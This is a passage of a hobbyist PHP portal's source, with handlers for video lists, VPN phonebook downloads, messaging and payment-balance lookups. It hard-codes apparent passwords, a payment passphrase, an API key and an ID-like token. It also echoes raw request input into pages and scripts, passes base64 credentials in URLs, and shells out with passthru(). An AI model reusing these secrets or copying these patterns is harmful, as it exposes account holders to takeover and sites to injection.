        echo Pinyin(trim(request("pinyin")),getcharset(),true,"cn");
	exit;
    case "unicode":
        echo str_to_unicode(trim(request("unicode")),getcharset());
	exit;
    case "tudou":
        tudou();
	exit;
    case "vedio":
        tudou();
	exit;
    case "pm":
        perfectmoney();
	exit;
    case "baidu":
        baidu();
	exit;	
    default:
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        }       
        elseif (substr(trim($_SERVER['SERVER_NAME']),1,6) == "mobile"){
        	//redirect(scriptpath()."?api=mobile");
        	//echo 'ffff';
        	exit;
        }       
        else{
                //mail('xcy6272003@126.com','x3193@web.x3193.cz.cc',$emailcontent.'server'.$_SERVER['REMOTE_HOST'].'IP:'.$_SERVER['REMOTE_ADDR'].strlen($_SERVER['REMOTE_ADDR']).'cliet:'.$_SERVER['SERVER_NAME'].'nr:'.'index.php'.' or '.$xmlstr.file_get_contents('php://stdin').time());
        } 

        bing();	
        //gmap2();
	exit;
}
?>
<?
function randwork(){
$max = '1000';
$rate  = trim(request('rate'))?trim(request('rate')):'0.5';
$rand = rand(1,$max);
if($rand < $rate*$max){
	$result = 'A';
}elseif($rand > $rate*$max){
	$result = 'B';
}
	//return $result;
	echo 'The result is : '.$result.' - ['.$rand.':1~'.$max.':'.$rate.']'; 
	if(date('H',time())=='19'||date('H',time())=='13'){
		//$voxeo = new voxeo_class();
  	//$voxeo->voxeosendsms('8615998963077','The result is : '.$result.' - ['.$rand.':1~'.$max.':'.$rate.']');  
	}      
}
?>

<?
function fileupdate(){
$filedir = 'haodai|net2ftp|phono|wordpress';
$dirlist = split("[|]",$filedir);
$filename = 'diy.php|phpinfo.php|filebox.php';
$filelist = split("[|]",$filename);
for($i=0;$i<count($dirlist);$i++){
	for($j=0;$j<count($filelist);$j++){
		passthru("cp ".$filelist[$j]." ./".$dirlist[$i]."/".$filelist[$j],$result);
		echo $result.'<br>';
	}
}
}
?>

<?php 
function fetion(){
$fetion = new fetion_class();
$getaccesstoken=$fetion->getaccesstoken();
echo $getaccesstoken['access_token'].' ';
$getuseropenid=$fetion->getuseropenid($getaccesstoken['access_token'],'');
print_r($getuseropenid['data']['openid'][0].' ');
$sendtextmsg=$fetion->sendtextmsg($getaccesstoken['access_token'],$getuseropenid['data']['openid'][0],'lswii');
print_r($sendtextmsg);
?>	

<?php 	
}
function checkSignature()
{
        $signature = $_GET["signature"];
        $timestamp = $_GET["timestamp"];
        $nonce = $_GET["nonce"];	
        		
	$token = '510212198004250318';
	$tmpArr = array($token, $timestamp, $nonce);
	sort($tmpArr, SORT_STRING);
	$tmpStr = implode( $tmpArr );
	$tmpStr = sha1( $tmpStr );
	
	if( $tmpStr == $signature ){
		return true;
	}else{
		return false;
	}
}


?>

<?php 
function baidu(){
?>	
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title></title>
<script type="text/javascript" name="baidu-tc-cerfication" data-appid="5791192" src="http://apps.bdimg.com/cloudaapi/lightapp.js"></script>
<style type="text/css">
	html, body { height:100%; overflow:hidden; }
	body { margin:0; }
</style>
</head>
<body>

</body>
</html>
<?php 	
}
?>


<?php 
function meitu(){
?>	
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>美图WEB开放平台</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="http://open.web.meitu.com/sources/xiuxiu.js" type="text/javascript"></script>
<script type="text/javascript">
window.onload=function(){
  xiuxiu.embedSWF("altContent",3,"100%","100%");
  /*第1个参数是加载编辑器div容器，第2个参数是编辑器类型，第3个参数是div容器宽，第4个参数是div容器高*/
  xiuxiu.setUploadURL("<?php echo trim(request('uploadurl'))?>");//修改为上传接收图片程序地址
  xiuxiu.onInit = function ()
  {
    xiuxiu.loadPhoto("<?php echo trim(request('picurl'))?>");//修改为要处理的图片url
  }
  xiuxiu.onUploadResponse = function (data)
  {
    //alert("上传响应" + data); 可以开启调试
  }
}
</script>
<style type="text/css">
	html, body { height:100%; overflow:hidden; }
	body { margin:0; }
</style>
</head>
<body>
<div id="altContent">
	<h1>美图秀秀</h1>
</div>
</body>
</html>
<?php 	
}
?>

<?php 
function discuz(){

switch (trim(request('action'))) {
         				case "ths":
               	?>

<div align="center">
<iframe id="ths" name="ths" frameborder="0" src="http://www.10jqka.com.cn/flash/" width="100%"  height="550px" scrolling="no">同花顺flash股市行情</iframe>
</div> 
            	
               	<?php 
               	break; 
               	case "meitu":
               	?>
<div align="center">
<iframe id="meitu" name="meitu" frameborder="0" src="<?php echo scriptpath();?>?api=meitu" width="100%"  height="550px" scrolling="no"></iframe>
</div>                	
               	<?php  
               	break;
               	case "zhibo":
               	?>

<div align="center">
<iframe id="TV123456789" name="TV123456789" frameborder="0" src="http://www.tv123456789.com/live.asp" width="100%"  height="550px" scrolling="no">TV123456789汇集所有卫星电视网络电视在线直播</iframe>
</div> 
            	
               	<?php 
               	break; 
               	case "meitu":
               	?>
<div align="center">
<iframe id="meitu" name="meitu" frameborder="0" src="<?php echo scriptpath();?>?api=meitu" width="100%"  height="550px" scrolling="no"></iframe>
</div>                	
               	<?php              	             	
               	break; 
        default:
        
               	break;
}

}
?>

<?php 
function PHPfetion(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 多媒体");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// 手机号、飞信密码
print_r(iconv('utf-8','gb2312',$fetion->send('15998963077', iconv('gb2312','utf-8','Hello!我444'))));	// 接收人手机号、飞信内容

$style->footer();
exit;
} // idoll function end
?>


<?php 
function wiqet(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 多媒体");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="120%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" height="89%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="top" style="border:0">
                <td align="top" id="Picnik">
<!--Load javascript library from Wiqet server-->
<script type="text/javascript" src="http://www.wiqet.com/wiqetapi/?api_key=baf4881253197349f6022d6f9cbac783"></script>
<script type="text/javascript">
/**
          Photo editor
        */
        var photo = new wiqet.photo.Editor('wiqetphoto', {
               'wiqetCode':           ''  //wiqet code only when you want to edit a Wiqet
            ,  'uniqueId':       '1'       //id to identify a user, defined by you
          } 
          , {
              //default flashplayer properties
              'width':              '450px'
            , 'height':             '375px'
            , 'bgcolor':            '#FFFFFF'
            , 'align':              'middle'
            , 'allowScriptAccess':  'always'
        }, 'callback');
</script>
<div id="wiqetphoto">Wiqet is loading.....</div>
<script type="text/javascript">
//function that is used to save the Wiqet information in your database
function callback(wiqetCode) {
       alert(wiqetCode);
      //Implement javascript that saves the data to your database and if necesarry do a redirect.
</script>
<?php 
$style->footer();
exit;
} // idoll function end
?>

<?php 
function tropo(){
?>	
{
   "tropo":[{"say":{"value":"Guess what? http://www.phono.com/audio/troporocks.mp3"}}]
}
<?php 	
}
?>

<?php 
function filemanager(){

}
?>

<?php 
function tel(){
	print_r($_SERVER);
}
?>

<?php 
function IVR(){
		$ivrflag == '';
		$voxeo = new voxeo_class();
		while($ivrflag != 'ok'){
			//$voxeo = new voxeo_class();
			$dialresult = $voxeo->OutboundDialing(trim(request('phone')));
			$ivrflag = $dialresult['result'];
		}	
		print_r($ivrflag);	
}
?>

<?php 
function msn(){
$sendMsg = new sendMsg();
$sendMsg->simpleSend('xcy6272003@126.com', 'EUIfgwe7', 'x3193@x3193.tk','message');
echo $sendMsg->result.' '.$sendMsg->error;
}
?>

<?php 
function fpdf(){
//$pdf=new PDF_Chinese();
//$pdf->AddBig5Font();
//$pdf->AddPage();
//$pdf->SetFont('Big5','',20);
//$pdf->Write(10,'{僧鸱 18 C 楞 83 %');
//$pdf->Output();

$pdf=new PDF_Chinese(); 
$pdf->AddGBFont(); 
$pdf->AddPage(); 
$pdf->SetFont('GB','',20); 
$pdf->Write(10,'简体中文汉字'); 
$pdf->Output(); 
}
?>

<?php 
function perfectmoney(){
$f=fopen('https://perfectmoney.com/acct/balance.asp?AccountID=652469&PassPhrase=EUIfgwe7', 'rb');

if($f===false){
   echo 'error openning url';
}

// getting data
$out=array(); $out="";
while(!feof($f)) $out.=fgets($f);
print_r($out) ;
fclose($f);

// searching for hidden fields
if(!preg_match_all("/<input name='(.*)' type='hidden' value='(.*)'>/", $out, $result, PREG_SET_ORDER)){
   echo 'Ivalid output';
   exit;
}

// putting data to array
$ar="";
foreach($result as $item){
   $key=$item[1];
   $ar[$key]=$item[2];
}

echo '<pre>';
print_r($ar);
echo '</pre>';
}
?>

<?php 
function webthumbnail(){

$thumb = new Webthumbnail($_GET["url"]);
$thumb
    ->setWidth(320)
    ->setHeight(240)
    ->setScreen(1280)
    ->captureToOutput();
//$thumb->captureToFile($path);    
}
?>

<?php 
function vpn(){
$sCrLf = chr(13) . chr(10);
$regsite = 'www.raptorvpn.com';
$vpnserver = 'spotflux.x3193.cu.cc';
session_start();
switch (trim(request('action'))) {  // case start
    	case "code":
		?>
[X3193 USAIP VPN]
[USAIP PPTP <?php echo trim(request("vpnname"));?>]
Encoding=0
Type=2
AutoLogon=0
UseRasCredentials=1
DialParamsUID=172546
Guid=7106BE987679AF4B8258EFCCADA692A5
BaseProtocol=1
VpnStrategy=1
ExcludedProtocols=2
LcpExtensions=1
DataEncryption=8
SwCompression=1
NegotiateMultilinkAlways=1
SkipNwcWarning=0
SkipDownLevelDialog=0
SkipDoubleDialDialog=0
DialMode=1
DialPercent=75
DialSeconds=120
HangUpPercent=10
HangUpSeconds=120
OverridePref=15
RedialAttempts=99
RedialSeconds=30
IdleDisconnectSeconds=0
RedialOnLinkFailure=0
CallbackMode=0
CustomDialDll=
CustomDialFunc=
CustomRasDialDll=
AuthenticateServer=0
ShareMsFilePrint=1
BindMsNetClient=1
SharedPhoneNumbers=0
GlobalDeviceSettings=0
PrerequisiteEntry=
PrerequisitePbk=
PreferredPort=VPN2-0
PreferredDevice=WAN Miniport (L2TP)
PreferredBps=0
PreferredHwFlow=1
PreferredProtocol=1
PreferredCompression=1
PreferredSpeaker=1
PreferredMdmProtocol=0
PreviewUserPw=1
PreviewDomain=0
PreviewPhoneNumber=0
ShowDialingProgress=1
ShowMonitorIconInTaskBar=1
CustomAuthKey=-1
AuthRestrictions=544
TypicalAuth=2
IpPrioritizeRemote=1
IpHeaderCompression=0
IpAddress=0.0.0.0
IpDnsAddress=0.0.0.0
IpDns2Address=0.0.0.0
IpWinsAddress=0.0.0.0
IpWins2Address=0.0.0.0
IpAssign=1
IpNameAssign=1
IpFrameSize=1006
IpDnsFlags=0
IpNBTFlags=1
TcpWindowSize=0
UseFlags=0
IpSecFlags=1
IpDnsSuffix=

NETCOMPONENTS=
ms_server=1
ms_msclient=1
ms_psched=1
ms_nwsapagent=1
ms_nwclient=1
ms_pacer=1
cfosspeed=1
odysseyim4=1
vmware_bridge=1

MEDIA=rastapi
Port=VPN2-0
Device=WAN <?php echo iconv('gb2312','utf-8','微型端口')?> (L2TP)
DEVICE=vpn
PhoneNumber=<?php echo trim(request("servername")).$sCrLf;?>  
AreaCode=
CountryCode=98
CountryID=98
UseDialingRules=0
Comment=
LastSelectedPhone=0
PromoteAlternates=0
TryNextAlternateOnFail=1		
		<?php 
      		break;
    	case "download": 
      If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
        if (trim(request("checkcode")) != ""){
         	AlertBack("四位验证码错误！" , 1);
        	break;
        }       
        elseif (trim(request("checkcode")) == ""){
         AlertBack("四位验证码为空！" , 1);
         break;
      	}               
      } 
      if (trim(request("servername")) == "" || trim(request("vpnname")) == ""){
        AlertBack("服务器或连接名为空！" , 1);
        break;
      }
	else{
      		header('Content-Type:application/octet-stream');
		header('Content-Disposition: attachment; filename="raptorvpn.com.pbk"');
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, httppath().'?api=vpn&action=code&vpnname='.trim(request("vpnname"))."&servername=".trim(request("servername")));
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			//curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
			$xmlstr = curl_exec($ch);
			curl_close($ch);
			echo $xmlstr;
		}	
      		break;	
      	default:
session_start();
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - VPN");
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

$tag = New TagAction(); 
      	
          $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=vpn&action=<?php  echo encodeuri("download");?>&skin=<?php  echo $skincolor;?>" method="post" name="vpn">
                        &nbsp服务器域名：<input type="text" class="text" name="servername" value="<?php echo $vpnserver;?>" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp网络连接名：<input type="text" class="text" name="vpnname" value="<?php echo strtoupper($regsite);?>" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php    
					$style->footer(); 
          break; 
}
exit;  
}    		
?>

<?php 
function tudou(){
header('Content-Type: text/html; charset=gb2312');
IF(is_wap()){
?>
<!DOCTYPE html 
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<?php 
}
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 短片");
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 30)
        $pagesize = 30;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 

switch (trim(request("action"))){
        case "media.list":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                         

                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                        

                        $_SESSION["tudou"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
                break;
        case "media.ulist":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}                        

                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_encode(trim(request("uname"))), 'pwd' => base64_encode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif ($_SESSION["tudou"]["uname"] == "" && $_SESSION["tudou"]["pwd"] == "" ){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode")));
                        break;
                }               
               	$tudou_media = new tudou_class();
               	$mediaulist = $tudou_media->tudoumediaulist(Base64_decode(trim($_SESSION["tudou"]["uname"])),$page,$pagesize);
                //print_r($mediaulist);
	        if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $mediaulist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="post" action="">
                <?php 
                $totalitem = $mediaulist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=20%>
                        标题
                </td>
                <td align="center" width=15%>
                        标签
                </td>
                <td align="center" width=15%>
                        用户名（昵称/ID）
                </td>
                <td align="center" width=5%>
                        状态
                </td>
                <td align="center" width=20%>
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.search')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">搜索</a> <a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.create')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">上传</a>
                </td> 
        </tr>
                <?php 
                for($i = 0; $i < $strpagesize; $i++){
                        $mediatitle = $mediaulist[$i]['mediatitle'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                        $mediatags = $mediaulist[$i]['mediatags'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                        $mediaownername = $mediaulist[$i]['mediaownername'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                        $mediaownernickname = $mediaulist[$i]['mediaownernickname'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaownerid = $mediaulist[$i]['mediaownerid'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaplayerurl = $mediaulist[$i]['mediaplayerurl'];
                        $mediaitemurl = $mediaulist[$i]['mediaitemurl'];
                        $mediatype = $mediaulist[$i]['mediatype'];
                        $mediadescription = $mediaulist[$i]['mediadescription'];
                        $mediapicurl = $mediaulist[$i]['mediapicurl'];
                        $mediatime = $mediaulist[$i]['mediatime'];
                        $mediacreatetime = $mediaulist[$i]['mediacreatetime'];
                        $mediaclass = $mediaulist[$i]['mediaclass'];
                        $mediachecked = $mediaulist[$i]['mediachecked'];
                        $mediaitemcode = $mediaulist[$i]['itemCode'];                        
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                <?php 
                        $tudou_media = new tudou_class();
               		$mediaviewer = $tudou_media->tudouviewer();
               		if($mediaviewer){
                ?>
                        <?php echo "<a style=\"color:#000000\" href=\"".$mediaitemurl."\">".$mediatitle."</a>";?>
                <?php 
			}
               		else{
                ?>
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=tudou&action=".encodeuri("media.view")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mediacode=".encodeuri($mediaitemcode)."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."\">".$mediatitle."</a>";?>
                <?php                		
               		}
                ?>                        
                </td>
                <td align="center"%>
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=1&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">".$mediatags."</a>";?>
                </td>
                <td align="center">
                        <?php echo $mediaownername."(".$mediaownernickname."/".$mediaownerid.")";?>
                </td>
                <td align="center">
                        <?php echo $domainstatus=='true'?"可用":"无效";?>
                </td>
                <td align="center">
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">收藏</a>";?> <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">网收</a>";?>
                </td>
        </tr>   
                	<?php 
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
